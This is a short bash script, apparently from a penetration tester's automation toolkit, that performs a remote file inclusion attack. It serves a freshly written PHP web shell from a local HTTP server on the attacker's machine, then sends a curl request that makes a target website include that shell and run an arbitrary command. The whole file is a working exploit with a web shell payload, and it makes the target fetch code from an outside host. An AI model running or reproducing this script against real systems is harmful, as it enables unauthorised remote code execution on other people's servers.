#!/bin/bash

: '
Remote RFI with HTTP
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website" "Cmd"

WEBSITE=${form_data["Website"]}
CMD=${form_data["Cmd"]}

python3 -m http.server 9001 &
HTTP_PID=$!

cat << 'EOF' > webShell.php
<?php system($_GET['cmd']); ?>
EOF

paste_command "curl -ks '${WEBSITE}http://${KALI_IP}:9001/webShell.php&cmd=${CMD}'"
xdotool key Return
sleep 5

kill $HTTP_PID
rm webShell.php